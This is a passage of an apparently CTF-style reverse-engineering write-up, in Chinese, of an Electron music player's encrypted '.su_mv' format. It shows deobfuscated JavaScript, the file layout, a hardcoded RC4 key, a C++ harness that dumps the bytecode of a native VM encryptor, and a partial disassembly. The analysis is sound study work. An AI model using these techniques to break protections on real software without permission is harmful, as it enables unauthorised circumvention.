BrowserWindow({'width':0x26c,'height':0x1f4,'minWidth':0x1cc,'minHeight':0x17c,'webPreferences':{'preload':path['join'](__dirname,_0x21a6e5(0xd)),'nodeIntegration':![],'contextIsolation':!![],'sandbox':![]}});mainWindow[_0x21a6e5(0xe)](path['join'](__dirname,_0x21a6e5(0xf)));mainWindow['on']('close',_0x4b76a6=>{const _0x3cfff3=_0x2e0b;if(forceClosing){return;}if(!sessionState['secureEnabled']||!sessionState[_0x3cfff3(0xc)]){return;}_0x4b76a6[_0x3cfff3(0x10)]();archiveIfNeeded()[_0x3cfff3(0x11)](()=>{})[_0x3cfff3(0x12)](()=>{forceClosing=!![];mainWindow['close']();});});}function registerIpcHandlers(){const _0xd03cfd=_0x2e0b;ipcMain['handle']('dialog:open-su-mv',async()=>{const _0x35afec=_0x2e0b;const _0xe19582=await dialog['showOpenDialog']({'title':_0x35afec(0x13),'properties':['openFile'],'filters':[{'name':'SU_MV','extensions':[_0x35afec(0x14)]}]});if(_0xe19582[_0x35afec(0x15)]||_0xe19582['filePaths'][_0x35afec(0x16)]===0x0){return'';}return _0xe19582['filePaths'][0x0];});ipcMain['handle'](_0xd03cfd(0x17),async(_0x2add9c,_0x1c2dd3)=>{const _0x108199=_0x2e0b;const _0x4c45f3=await fs[_0x108199(0xa)][_0x108199(0x18)](_0x1c2dd3);return new Uint8Array(_0x4c45f3);});ipcMain[_0xd03cfd(0x19)](_0xd03cfd(0x1a),async(_0x349e18,{secureEnabled:_0x356adb,currentSuMvPath:_0x51c4b5,currentPayload:_0x436a7a})=>{const _0x535fba=_0x2e0b;sessionState[_0x535fba(0xb)]=Boolean(_0x356adb);sessionState[_0x535fba(0xc)]=_0x51c4b5||'';sessionState['currentPayload']=toBufferOrNull(_0x436a7a);return{'ok':!![]};});ipcMain[_0xd03cfd(0x19)]('playback:ended',async()=>{return archiveIfNeeded();});ipcMain[_0xd03cfd(0x19)](_0xd03cfd(0x1b),async(_0x14e71d,_0x21d8b4)=>{const _0x3ee46a=_0x2e0b;return secureArchive(_0x21d8b4,sessionState[_0x3ee46a(0x1c)]);});}app['whenReady']()[_0x5d3955(0x1d)](()=>{const _0x58ba4d=_0x2e0b;registerIpcHandlers();createWindow();app['on'](_0x58ba4d(0x1e),()=>{const _0x8e3f4e=_0x2e0b;if(BrowserWindow['getAllWindows']()[_0x8e3f4e(0x16)]===0x0){forceClosing=![];createWindow();}});});app['on'](_0x5d3955(0x1f),()=>{const _0x554535=_0x2e0b;if(process['platform']!==_0x554535(0x20)){app[_0x554535(0x21)]();}});
```

去混淆

```JavaScript
const fs = require('fs');
const path = require('path');

/**
 * 反混淆字符串数组混淆的 JavaScript 代码
 * @param {string} code - 混淆的 JavaScript 代码
 * @returns {string} - 反混淆后的代码
 */
function deobfuscateStringArray(code) {
    // 匹配字符串数组定义模式
    const arrayPattern = /function\s+(_0x[a-f0-9]+)\(\)\s*\{[^}]*const\s+_0x[a-f0-9]+\s*=\s*\[(.*?)\];[^}]*return\s+_0x[a-f0-9]+;\}/gs;
    
    // 匹配字符串访问函数
    const accessPattern = /function\s+(_0x[a-f0-9]+)\(_0x[a-f0-9]+,_0x[a-f0-9]+\)\s*\{[^}]*_0x[a-f0-9]+\s*=\s*_0x[a-f0-9]+\s*-\s*0x0;[^}]*return\s+_0x[a-f0-9]+\[_0x[a-f0-9]+\];[^}]*}/gs;
    
    // 匹配字符串使用
    const usagePattern = /_0x[a-f0-9]+\((0x[0-9a-f]+)\)/g;
    
    let result = code;
    
    // 提取字符串数组
    const arrayMatch = arrayPattern.exec(code);
    if (arrayMatch) {
        const arrayName = arrayMatch[1];
        const arrayContent = arrayMatch[2];
        
        // 解析字符串数组
        const strings = arrayContent.split(',').map(s => {
            // 移除引号
            s = s.trim();
            if (s.startsWith("'") && s.endsWith("'")) {
                return s.slice(1, -1);
            }
            if (s.startsWith('"') && s.endsWith('"')) {
                return s.slice(1, -1);
            }
            return s;
        });
        
        console.log(`[+] 找到字符串数组: ${arrayName}, 包含 ${strings.length} 个字符串`);
        console.log(`[+] 前10个字符串:`, strings.slice(0, 10));
        
        // 提取访问函数
        const accessMatch = accessPattern.exec(code);
        if (accessMatch) {
            const accessName = accessMatch[1];
            
            // 替换所有字符串使用
            result = result.replace(usagePattern, (match, index) => {
                const idx = parseInt(index, 16);
                if (idx < strings.length) {
                    return JSON.stringify(strings[idx]);
                }
                return match;
            });
            
            console.log(`[+] 字符串访问函数: ${accessName}`);
        }
    }
    
    return result;
}

/**
 * 美化 JavaScript 代码
 * @param {string} code - JavaScript 代码
 * @returns {string} - 美化后的代码
 */
function beautify(code) {
    // 简单的美化：添加适当的换行和缩进
    let result = code;
    let indent = 0;
    const lines = result.split('\n');
    const beautified = [];
    
    for (let line of lines) {
        line = line.trim();
        
        // 减少缩进
        if (line.startsWith('}') || line.startsWith(']') || line.startsWith(')')) {
            indent = Math.max(0, indent - 2);
        }
        
        // 添加当前行
        if (line) {
            beautified.push(' '.repeat(indent) + line);
        }
        
        // 增加缩进
        if (line.endsWith('{') || line.endsWith('[')) {
            indent += 2;
        }
    }
    
    return beautified.join('\n');
}

/**
 * 提取关键函数
 * @param {string} code - JavaScript 代码
 * @param {string} funcName - 函数名
 * @returns {string} - 函数代码
 */
function extractFunction(code, funcName) {
    const funcPattern = new RegExp(`(?:function\\s+${funcName}|${funcName}\\s*[:=]\\s*function)\\s*\\([^)]*\\)\\s*\\{`, 'g');
    const match = funcPattern.exec(code);
    
    if (!match) {
        return '';
    }
    
    const start = match.index;
    let braceCount = 0;
    let pos = start + match[0].length - 1; // 在 { 处
    
    while (pos < code.length) {
        if (code[pos] === '{') {
            braceCount++;
        } else if (code[pos] === '}') {
            braceCount--;
            if (braceCount === 0) {
                return code.substring(start, pos + 1);
            }
        }
        pos++;
    }
    
    return '';
}

function main() {
    const files = [
        'extracted_app/main.js',
        'extracted_app/src/main/native-bridge.js',
        'extracted_app/src/renderer/app.js',
        'extracted_app/src/common/sumv-browser.js'
    ];
    
    console.log('=== JavaScript 去混淆工具 ===\n');
    
    for (const file of files) {
        console.log(`\n处理文件: ${file}`);
        
        if (!fs.existsSync(file)) {
            console.log(`[!] 文件不存在: ${file}`);
            continue;
        }
        
        // 读取原始文件
        const original = fs.readFileSync(file, 'utf8');
        console.log(`[+] 原始文件大小: ${original.length} 字符`);
        
        // 去混淆
        const deobfuscated = deobfuscateStringArray(original);
        console.log(`[+] 去混淆后大小: ${deobfuscated.length} 字符`);
        
        // 美化
        const beautified = beautify(deobfuscated);
        
        // 保存去混淆后的文件
        const outputFile = file.replace('.js', '_deobfuscated.js');
        fs.writeFileSync(outputFile, beautified);
        console.log(`[+] 保存到: ${outputFile}`);
        
        // 提取关键函数
        if (file.includes('main.js')) {
            const secureArchive = extractFunction(beautified, 'secureArchive');
            if (secureArchive) {
                fs.writeFileSync('secureArchive.js', secureArchive);
                console.log(`[+] 提取 secureArchive 函数`);
            }
        } else if (file.includes('native-bridge.js')) {
            const createVmEncryptorBridge = extractFunction(beautified, 'createVmEncryptorBridge');
            if (createVmEncryptorBridge) {
                fs.writeFileSync('createVmEncryptorBridge.js', createVmEncryptorBridge);
                console.log(`[+] 提取 createVmEncryptorBridge 函数`);
            }
        } else if (file.includes('app.js')) {
            const openSuMvFile = extractFunction(beautified, 'openSuMvFile');
            if (openSuMvFile) {
                fs.writeFileSync('openSuMvFile.js', openSuMvFile);
                console.log(`[+] 提取 openSuMvFile 函数`);
            }
        } else if (file.includes('sumv-browser.js')) {
            const parseSuMv = extractFunction(beautified, 'parseSuMv');
            if (parseSuMv) {
                fs.writeFileSync('parseSuMv.js', parseSuMv);
                console.log(`[+] 提取 parseSuMv 函数`);
            }
        }
    }
    
    console.log('\n=== 去混淆完成 ===');
}

// 运行
if (require.main === module) {
    main();
}

module.exports = {
    deobfuscateStringArray,
    beautify,
    extractFunction
};
const {app,BrowserWindow,dialog,ipcMain}=require('electron');
const fs=require('fs');
const path=require(_0x5d3955(0x0));  // 'path'const {createVmEncryptorBridge}=require(_0x5d3955(0x1));  // './src/main/native-bridge'const vmEncryptorBridge=createVmEncryptorBridge(__dirname);
```

导入了 `createVmEncryptorBridge`，这是加密的核心模块。

```
反混淆 createVmEncryptorBridge
function createVmEncryptorBridge(appDir) {
    // 尝试加载 native 模块的多个可能路径const possiblePaths = [
        path.join(appDir, 'native', 'build', 'Release', 'vm_encryptor.node'),
        path.join(process.resourcesPath || '', 'native', 'build', 'Release', 'vm_encryptor.node'),
        path.join(process.resourcesPath || '', 'app', 'native', 'build', 'Release', 'vm_encryptor.node')
    ];
    
    // 查找存在的路径const modulePath = possiblePaths.find(p => p && fs.existsSync(p));
    
    let nativeModule = null;
    if (!modulePath) {
        return {};  // 找不到 native 模块
    }
    
    nativeModule = require(modulePath);
    
    // 定义 vmEncrypt 函数function vmEncrypt(data) {
        // 优先使用 native 模块if (nativeModule && typeof nativeModule.vmEncrypt === 'function') {
            const result = nativeModule.vmEncrypt(Buffer.from(data));
            if (Buffer.isBuffer(result)) {
                return result;
            }
            throw new Error('E');
        }
        // 降级到 placeholderreturn placeholderVmEncrypt(data);
    }
    
    return {vmEncrypt};
}
```

分析 placeholderVmEncrypt

```JavaScript
function placeholderVmEncrypt(data) {
    const input = Buffer.from(data);
    const output = new Uint8Array(input.length + 4);
    
    // 添加 SVE4 头
    output[0] = 0x53;  // 'S'
    output[1] = 0x56;  // 'V'
    output[2] = 0x45;  // 'E'
    output[3] = 0x34;  // '4'// 简单的 XOR + ROL 加密let key = 0x6d;
    for (let i = 0; i < input.length; i++) {
        key = (key ^ (0x32 + (i & 0xf))) & 0xff;
        const shift = i % 5 + 1;
        output[i + 4] = rol8(input[i] ^ key, shift);
    }
    
    return Buffer.from(output);
}

function rol8(val, shift) {
    shift = shift & 7;
    return ((val << shift) | (val >> (8 - shift))) & 0xff;
}
```

- `placeholderVmEncrypt` 添加 "SVE4" 头

查看 `sumv-browser.js`

parseSuMv 函数

```JavaScript
async function parseSuMv(rawBytes) {
    const data = rawBytes instanceof Uint8Array ? rawBytes : new Uint8Array(rawBytes);
    
    // 1. 检查最小长度if (data.length < 16) {
        throw new Error('E');
    }
    
    // 2. 检查魔数const magic = String.fromCharCode(data[0], data[1], data[2], data[3]);
    if (magic !== 'SUMV') {
        throw new Error('E');
    }
    
    // 3. 读取头部const version = data[4];
    const formatCode = data[6];
    
    const view = new DataView(data.buffer, data.byteOffset, data.byteLength);
    const uncompressedSize = view.getUint32(8, true);   // 小端序const compressedSize = view.getUint32(12, true);
    
    // 4. 验证大小if (uncompressedSize === 0 || compressedSize === 0) {
        throw new Error('E');
    }
    if (16 + compressedSize > data.length) {
        throw new Error('E');
    }
    
    // 5. 提取压缩数据const compressed = data.subarray(16, 16 + compressedSize);
    
    // 6. LZ77 解压const decompressed = decompress(compressed, uncompressedSize);
    
    // 7. RC4 解密const payload = rc4Decrypt(decompressed, 'SUMUSICPLAYER');
    
    return {
        version,
        formatCode,
        isValid: true,
        payload 
    };
}
```

SUMV 格式结构

```Plain
偏移    大小    说明
0-3     4      魔数 "SUMV"
4       1      版本号
5       1      (未使用)
6       1      格式代码
7       1      (未使用)
8-11    4      解压后大小 (LE uint32)
12-15   4      压缩数据大小 (LE uint32)
16-     N      LZ77 压缩的 RC4 加密数据
```

解码流程

```Plain
.su_mv 文件
    ↓
读取 SUMV 头部
    ↓
提取压缩数据
    ↓
LZ77 解压
    ↓
RC4 解密 (key="SUMUSICPLAYER")
    ↓
WAV 音频数据 (payload)
```

提取字节码

```C++
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <windows.h>

#pragma pack(push, 1)
typedef struct {
    uint8_t opcode;
    uint8_t pad1[7];
    uint64_t operand;
    uint8_t reg_index;
    uint8_t pad2[3];
    uint32_t jump_param;
    uint64_t jump_target;
    uint64_t end_offset;
    uint64_t extra;
} VMInstr;
#pragma pack(pop)

int main() {
    HMODULE hMod = LoadLibraryA("vm_encryptor.node");
    if (!hMod) {
        printf("Failed to load: %lu\n", GetLastError());
        return 1;
    }
    
    uintptr_t base = (uintptr_t)hMod;
    printf("Module base: 0x%llx\n", (unsigned long long)base);
    
    uint8_t* init_flag = (uint8_t*)(base + 0x23CB4);
    uint8_t* parse_flag = (uint8_t*)(base + 0x23CB5);
    
    printf("Before init - initialized: %d, parsed: %d\n", *init_flag, *parse_flag);
    
    typedef void* (__attribute__((ms_abi)) *fn_bytecode_gen)(void* a1);
    typedef uint8_t (__attribute__((ms_abi)) *fn_bytecode_parse)(void* a1);
    
    fn_bytecode_gen gen = (fn_bytecode_gen)(base + 0x2E00);
    fn_bytecode_parse parse = (fn_bytecode_parse)(base + 0x1D90);
    
    uint64_t vec[3] = {0, 0, 0};
    
    printf("Calling bytecode generator...\n");
    gen(vec);
    
    printf("Vector: data=0x%llx, end=0x%llx, cap=0x%llx\n",
           (unsigned long long)vec[0], (unsigned long long)vec[1], (unsigned long long)vec[2]);
    
    if (vec[0] && vec[1] > vec[0]) {
        size_t bytecode_size = vec[1] - vec[0];
        printf("Raw bytecode size: %zu bytes\n", bytecode_size);
        
        FILE* f = fopen("vm_bytecode_raw.bin", "wb");
        fwrite((void*)vec[0], 1, bytecode_size, f);
        fclose(f);
        printf("Raw bytecode dumped to vm_bytecode_raw.bin\n");
        
        printf("Calling bytecode parser...\n");
        uint8_t result = parse(vec);
        printf("Parse result: %d\n", result);
        
        uint64_t* p_start = (uint64_t*)(base + 0x23CB8);
        uint64_t* p_end = (uint64_t*)(base + 0x23CC0);
        
        printf("Parsed instrs: start=0x%llx, end=0x%llx\n",
               (unsigned long long)*p_start, (unsigned long long)*p_end);
        
        if (*p_start && *p_end > *p_start) {
            size_t instr_bytes = *p_end - *p_start;
            size_t num_instrs = instr_bytes / 48;
            printf("Number of instructions: %zu\n", num_instrs);
            
            VMInstr* instrs = (VMInstr*)(*p_start);
            
            FILE* f2 = fopen("vm_instructions.bin", "wb");
            fwrite(instrs, 48, num_instrs, f2);
            fclose(f2);
            printf("Dumped to vm_instructions.bin\n");
            
            const char* opnames[] = {
                "HALT", "PUSH8", "PUSH16", "PUSH32", "PUSH64",
                "PUSH_REG", "POP_REG", "ADD", "SUB", "MUL", "DIV",
                "XOR", "AND", "OR", "CMP_EQ", "CMP_LT",
                "JMP", "JMP_TRUE", "JMP_FALSE",
                "LOAD8", "STORE8", "LOAD16", "STORE16",
                "LOAD32", "STORE32", "LOAD64", "STORE64",
                "SHL", "SHR", "DUP", "SWAP", "DROP"
            };
            
            FILE* f3 = fopen("vm_disasm.txt", "w");
            for (size_t i = 0; i < num_instrs; i++) {
                VMInstr* ins = &instrs[i];
                const char* name = ins->opcode < 32 ? opnames[ins->opcode] : "UNKNOWN";
                
                if (ins->opcode >= 1 && ins->opcode <= 4) {
                    fprintf(f3, "[%3zu] %s %llu (0x%llx)\n", i, name,
                           (unsigned long long)ins->operand, (unsigned long long)ins->operand);
                } else if (ins->opcode == 5 || ins->opcode == 6) {
                    fprintf(f3, "[%3zu] %s r%d\n", i, name, ins->reg_index);
                } else if (ins->opcode >= 16 && ins->opcode <= 18) {
                    fprintf(f3, "[%3zu] %s -> instr[%llu]\n", i, name,
                           (unsigned long long)ins->jump_target);
                } else {
                    fprintf(f3, "[%3zu] %s\n", i, name);
                }
            }
            fclose(f3);
            printf("Disassembly written to vm_disasm.txt\n");
        }
    }
    
    if (vec[0]) free((void*)vec[0]);
    FreeLibrary(hMod);
    return 0;
}
```

得到汇编代码，反编译

```YAML
[3] r0 = (r13 / 64)
[7] r1 = (r0 * 64)
[11] r2 = (r13 - r1)
[15] r3 = (64 - r2)
[19] r4 = (r13 + r3)
[24] MEM64[(r15 + 0)] = r4
[26] r7 = r4
[30] r5 = (r13 / 8)
[32] r9 = 0
[35] flag = (r9 < r5)
[36] if !flag: JMP -> 56
[43] r6 = MEM64[(r14 + (r9 << 3))]
[50] MEM64[(r12 + (r9 << 3))] = r6
[54] r9 = (r9 + 1)
[55] JMP -> 33
[59] r9 = (r5 << 3)
[62] flag = (r9 < r13)
[63] if !flag: JMP -> 79
[68] r6 = MEM8[(r14 + r9)]
[73] MEM8[(r12 + r9)] = r6
[77] r9 = (r9 + 1)
[78] JMP -> 60
[80] r9 = r13
[83] flag = (r9 < r7)
[84] if !flag: JMP -> 95
[89] MEM8[(r12 + r9)] = r3
[93] r9 = (r9 + 1)
[94] JMP -> 81
[99] MEM32[(r15 + 8)] = 0x10203
[104] MEM32[(r15 + 12)] = 0x4050607
[109] MEM32[(r15 + 16)] = 0x8090a0b
[114] MEM32[(r15 + 20)] = 0xc0d0e0f
[119] MEM32[(r15 + 24)] = 0x10111213
[124] MEM32[(r15 + 28)] = 0x14151617
[129] MEM32[(r15 + 32)] = 0x18191a1b
[134] MEM32[(r15 + 36)] = 0x1c1d1e1f
[136] r10 = 0
[139] flag = (r10 < r7)
[140] if !flag: JMP -> 9198
[145] r0 = MEM32[(r12 + r10)]
[151] r1 = ((r0 >> 24) & 255)
[157] r2 = ((r0 >> 8) & 0xff00)
[163] r3 = ((r0 << 8) & 0xff0000)
[169] r4 = ((r0 << 24) & 0xff000000)
[182] MEM32[(r15 + 40)] = (((r1 | r2) | r3) | r4)
[189] r0 = MEM32[((r12 + r10) + 4)]
[195] r1 = ((r0 >> 24) & 255)
[201] r2 = ((r0 >> 8) & 0xff00)
[207] r3 = ((r0 << 8) & 0xff0000)
[213] r4 = ((r0 << 24) & 0xff000000)
[226] MEM32[(r15 + 44)] = (((r1 | r2) | r3) | r4)
[233] r0 = MEM32[((r12 + r10) + 8)]
[239] r1 = ((r0 >> 24) & 255)
[245] r2 = ((r0 >> 8) & 0xff00)
[251] r3 = ((r0 << 8) & 0xff0000)
[257] r4 = ((r0 << 24) & 0xff000000)
[270] MEM32[(r15 + 48)] = (((r1 | r2) | r3) | r4)
[277] r0 = MEM32[((r12 + r10) + 12)]
[283] r1 = ((r0 >> 24) & 255)
[289] r2 = ((r0 >> 8) & 0xff00)
[295] r3 = ((r0 << 8) & 0xff0000)
[301] r4 = ((r0 << 24) & 0xff000000)
[314] MEM32[(r15 + 52)] = (((r1 | r2) | r3) | r4)
[321] r0 = MEM32[((r12 + r10) + 16)]
[327] r1 = ((r0 >> 24) & 255)
[333] r2 = ((r0 >> 8) & 0xff00)
[339] r3 = ((r0 << 8) & 0xff0000)
[345] r4 = ((r0 << 24) & 0xff000000)
[358] MEM32[(r15 + 56)] = (((r1 | r2) | r3) | r4)
[365] r0 = MEM32[((r12 + r10) + 20)]
[371] r1 = ((r0 >> 24) & 255)
[377] r2 = ((r0 >> 8) & 0xff00)
[383] r3 = ((r0 << 8) & 0xff0000)
[389] r4 = ((r0 << 24) & 0xff000000)
[402] MEM32[(r15 + 60)] = (((r1 | r2) | r3) | r4)
[409] r0 = MEM32[((r12 + r10) + 24)]
[415] r1 = ((r0 >> 24) & 255)
[421] r2 = ((r0 >> 8) & 0xff00)
[427] r3 = ((r0 << 8) & 0xff0000)
[433] r4 = ((r0 << 24) & 0xff000000)
[446] MEM32[(r15 + 64)] = (((r1 | r2) | r3) | r4)
[453] r0 = MEM32[((r12 + r10) + 28)]
[459] r1 = ((r0 >> 24) & 255)
[465] r2 = ((r0 >> 8) & 0xff00)
[471] r3 = ((r0 << 8) & 0xff0000)
[477] r4 = ((r0 << 24) & 0xff000000)
[490] MEM32[(r15 + 68)] = (((r1 | r2) | r3) | r4)
[497] r0 = MEM32[((r12 + r10) + 32)]
[503] r1 = ((r0 >> 24) & 255)
[509] r2 = ((r0 >> 8) & 0xff00)
[515] r3 = ((r0 << 8) & 0xff0000)
[521] r4 = ((r0 << 24) & 0xff000000)
[534] MEM32[(r15 + 72)] = (((r1 | r2) | r3) | r4)
[541] r0 = MEM32[((r12 + r10) + 36)]
[547] r1 = ((r0 >> 24) & 255)
[553] r2 = ((r0 >> 8) & 0xff00)
[559] r3 = ((r0 << 8) & 0xff0000)
[565] r4 = ((r0 << 24) & 0xff000000)
[578] MEM32[(r15 + 76)] = (((r1 | r2) | r3) | r4)
[585] r0 = MEM32[((r12 + r10) + 40)]
[591] r1 = ((r0 >> 24) & 255)
[597] r2 = ((r0 >> 8) & 0xff00)
[603] r3 = ((r0 << 8) & 0xff0000)
[609] r4 = ((r0 << 24) & 0xff000000)
[622] MEM32[(r15 + 80)] = (((r1 | r2) | r3) | r4)
[629] r0 = MEM32[((r12 + r10) + 44)]
[635] r1 = ((r0 >> 24) & 255)
[641] r2 = ((r0 >> 8) & 0xff00)
[647] r3 = ((r0 << 8) & 0xff0000)
[653] r4 = ((r0 << 24) & 0xff000000)
[666] MEM32[(r15 + 84)] = (((r1 | r2) | r3) | r4)
[673] r0 = MEM32[((r12 + r10) + 48)]
[679] r1 = ((r0 >> 24) & 255)
[685] r2 = ((r0 >> 8) & 0xff00)
[691] r3 = ((r0 << 8) & 0xff0000)
[697] r4 = ((r0 << 24) & 0xff000000)
[710] MEM32[(r15 + 88)] = (((r1 | r2) | r3) | r4)
[717] r0 = MEM32[((r12 + r10) + 52)]
[723] r1 = ((r0 >> 24) & 255)
[729] r2 = ((r0 >> 8) & 0xff00)
[735] r3 = ((r0 << 8) & 0xff0000)
[741] r4 = ((r0 << 24) & 0xff000000)
[754] MEM32[(r15 + 92)] = (((r1 | r2) | r3) | r4)
[761] r0 = MEM32[((r12 + r10) + 56)]
[767] r1 = ((r0 >> 24) & 255)
[773] r2 = ((r0 >> 8) & 0xff00)
[779] r3 = ((r0 << 8) & 0xff0000)
[785] r4 = ((r0 << 24) & 0xff000000)
[798] MEM32[(r15 + 96)] = (((r1 | r2) | r3) | r4)
[805] r0 = MEM32[((r12 + r10) + 60)]
[811] r1 = ((r0 >> 24) & 255)
[817] r2 = ((r0 >> 8) & 0xff00)
[823] r3 = ((r0 << 8) & 0xff0000)
[829] r4 = ((r0 << 24) & 0xff000000)
[842] MEM32[(r15 + 100)] = (((r1 | r2) | r3) | r4)
[850] MEM32[(r15 + 104)] = MEM32[(r15 + 8)]
[858] MEM32[(r15 + 108)] = MEM32[(r15 + 12)]
[866] MEM32[(r15 + 112)] = MEM32[(r15 + 16)]
[874] MEM32[(r15 + 116)] = MEM32[(r15 + 20)]
[882] MEM32[(r15 + 120)] = MEM32[(r15 + 24)]
[890] MEM32[(r15 + 124)] = MEM32[(r15 + 28)]
[898] MEM32[(r15 + 128)] = MEM32[(r15 + 32)]
[906] MEM32[(r15 + 132)] = MEM32[(r15 + 36)]
[911] MEM32[(r15 + 216)] = 0x73756572
[916] MEM32[(r15 + 220)] = 0
[928] MEM32[(r15 + 216)] = (MEM32[(r15 + 216)] + 0x70336364)
[940] MEM32[(r15 + 220)] = (MEM32[(r15 + 220)] + 0x70336364)
[969] MEM32[(r15 + 104)] = ((((MEM32[(r15 + 108)] ^ MEM32[(r15 + 216)]) << 3) | ((MEM32[(r15 + 108)] ^ MEM32[(r15 + 216)]) >> 29)) + MEM32[(r15 + 104)])
[998] MEM32[(r15 + 108)] = ((((MEM32[(r15 + 112)] ^ MEM32[(r15 + 104)]) << 5) | ((MEM32[(r15 + 112)] ^ MEM32[(r15 + 104)]) >> 27)) + MEM32[(r15 + 108)])
[1027] MEM32[(r15 + 112)] = ((((MEM32[(r15 + 116)] ^ MEM32[(r15 + 108)]) << 7) | ((MEM32[(r15 + 116)] ^ MEM32[(r15 + 108)]) >> 25)) + MEM32[(r15 + 112)])
[1056] MEM32[(r15 + 116)] = ((((MEM32[(r15 + 120)] ^ MEM32[(r15 + 112)]) << 11) | ((MEM32[(r15 + 120)] ^ MEM32[(r15 + 112)]) >> 21)) + MEM32[(r15 + 116)])
[1085] MEM32[(r15 + 120)] = ((((MEM32[(r15 + 124)] ^ MEM32[(r15 + 116)]) << 13) | ((MEM32[(r15 + 124)] ^ MEM32[(r15 + 116)]) >> 19)) + MEM32[(r15 + 120)])
[1114] MEM32[(r15 + 124)] = ((((MEM32[(r15 + 128)] ^ MEM32[(r15 + 120)]) << 17) | ((MEM32[(r15 + 128)] ^ MEM32[(r15 + 120)]) >> 15)) + MEM32[(r15 + 124)])
[1143] MEM32[(r15 + 128)] = ((((MEM32[(r15 + 132)] ^ MEM32[(r15 + 124)]) << 19) | ((MEM32[(r15 + 132)] ^ MEM32[(r15 + 124)]) >> 13)) + MEM32[(r15 + 128)])
[1172] MEM32[(r15 + 132)] = ((((MEM32[(r15 + 104)] ^ MEM32[(r15 + 128)]) << 23) | ((MEM32[(r15 + 104)] ^ MEM32[(r15 + 128)]) >> 9)) + MEM32[(r15 + 132)])
[1190] MEM32[(r15 + 136)] = ((MEM32[(r15 + 104)] ^ MEM32[(r15 + 112)]) ^ MEM32[(r15 + 216)])
[1212] MEM32[(r15 + 140)] = ((MEM32[(r15 + 108)] ^ MEM32[(r15 + 116)]) ^ (MEM32[(r15 + 216)] + 0x62616f7a))
[1234] MEM32[(r15 + 144)] = ((MEM32[(r15 + 120)] ^ MEM32[(r15 + 128)]) ^ (MEM32[(r15 + 216)] + 0x6f6e6777))
[1256] MEM32[(r15 + 148)] = ((MEM32[(r15 + 124)] ^ MEM32[(r15 + 132)]) ^ (MEM32[(r15 + 216)] + 0x696e6221))
[1271] MEM32[(r15 + 152)] = (MEM32[(r15 + 104)] + MEM32[(r15 + 120)])
[1286] MEM32[(r15 + 156)] = (MEM32[(r15 + 108)] + MEM32[(r15 + 124)])
[1301] MEM32[(r15 + 160)] = (MEM32[(r15 + 112)] + MEM32[(r15 + 128)])
[1316] MEM32[(r15 + 164)] = (MEM32[(r15 + 116)] + MEM32[(r15 + 132)])
[1329] MEM32[(r15 + 168)] = (MEM32[(r15 + 104)] ^ MEM32[(r15 + 124)])
[1342] MEM32[(r15 + 172)] = (MEM32[(r15 + 108)] ^ MEM32[(r15 + 128)])
[1355] MEM32[(r15 + 176)] = (MEM32[(r15 + 112)] ^ MEM32[(r15 + 132)])
[1368] MEM32[(r15 + 180)] = (MEM32[(r15 + 116)] ^ MEM32[(r15 + 120)])
[1385] MEM32[(r15 + 224)] = ((MEM32[(r15 + 72)] >> 8) | (MEM32[(r15 + 72)] << 24))
[1400] MEM32[(r15 + 224)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 76)])
[1413] MEM32[(r15 + 224)] = (MEM32[(r15 + 224)] ^ MEM32[(r15 + 136)])
[1430] MEM32[(r15 + 228)] = ((MEM32[(r15 + 76)] << 3) | (MEM32[(r15 + 76)] >> 29))
[1443] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ MEM32[(r15 + 224)])
[1451] MEM32[(r15 + 72)] = MEM32[(r15 + 224)]
[1459] MEM32[(r15 + 76)] = MEM32[(r15 + 228)]
[1476] MEM32[(r15 + 224)] = ((MEM32[(r15 + 80)] >> 8) | (MEM32[(r15 + 80)] << 24))
[1491] MEM32[(r15 + 224)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 84)])
[1504] MEM32[(r15 + 224)] = (MEM32[(r15 + 224)] ^ MEM32[(r15 + 140)])
[1521] MEM32[(r15 + 228)] = ((MEM32[(r15 + 84)] << 3) | (MEM32[(r15 + 84)] >> 29))
[1534] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ MEM32[(r15 + 224)])
[1542] MEM32[(r15 + 80)] = MEM32[(r15 + 224)]
[1550] MEM32[(r15 + 84)] = MEM32[(r15 + 228)]
[1567] MEM32[(r15 + 224)] = ((MEM32[(r15 + 88)] >> 8) | (MEM32[(r15 + 88)] << 24))
[1582] MEM32[(r15 + 224)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 92)])
[1595] MEM32[(r15 + 224)] = (MEM32[(r15 + 224)] ^ MEM32[(r15 + 144)])
[1612] MEM32[(r15 + 228)] = ((MEM32[(r15 + 92)] << 3) | (MEM32[(r15 + 92)] >> 29))
[1625] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ MEM32[(r15 + 224)])
[1633] MEM32[(r15 + 88)] = MEM32[(r15 + 224)]
[1641] MEM32[(r15 + 92)] = MEM32[(r15 + 228)]
[1658] MEM32[(r15 + 224)] = ((MEM32[(r15 + 96)] >> 8) | (MEM32[(r15 + 96)] << 24))
[1673] MEM32[(r15 + 224)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 100)])
[1686] MEM32[(r15 + 224)] = (MEM32[(r15 + 224)] ^ MEM32[(r15 + 148)])
[1703] MEM32[(r15 + 228)] = ((MEM32[(r15 + 100)] << 3) | (MEM32[(r15 + 100)] >> 29))
[1716] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ MEM32[(r15 + 224)])
[1724] MEM32[(r15 + 96)] = MEM32[(r15 + 224)]
[1732] MEM32[(r15 + 100)] = MEM32[(r15 + 228)]
[1756] MEM32[(r15 + 224)] = (((MEM32[(r15 + 72)] << 4) ^ (MEM32[(r15 + 72)] >> 5)) + MEM32[(r15 + 76)])
[1776] MEM32[(r15 + 224)] = ((MEM32[(r15 + 220)] + MEM32[(r15 + 152)]) ^ MEM32[(r15 + 224)])
[1793] MEM32[(r15 + 228)] = ((MEM32[(r15 + 84)] << 1) | (MEM32[(r15 + 84)] >> 31))
[1808] MEM32[(r15 + 228)] = (MEM32[(r15 + 228)] ^ (MEM32[(r15 + 220)] >> 1))
[1823] MEM32[(r15 + 184)] = (MEM32[(r15 + 224)] + MEM32[(r15 + 228)])
[1847] MEM32[(r15 + 224)] = (((MEM32[(r15 + 76)] << 4) ^ (MEM32[(r15 + 76)] >> 5)) + MEM32[(r15 + 80)])
[1867] MEM32[(r15 + 224)] = ((MEM32[(r15 + 220)] + MEM32[(r15 + 156)]) ^ MEM32[(r15 + 224)])
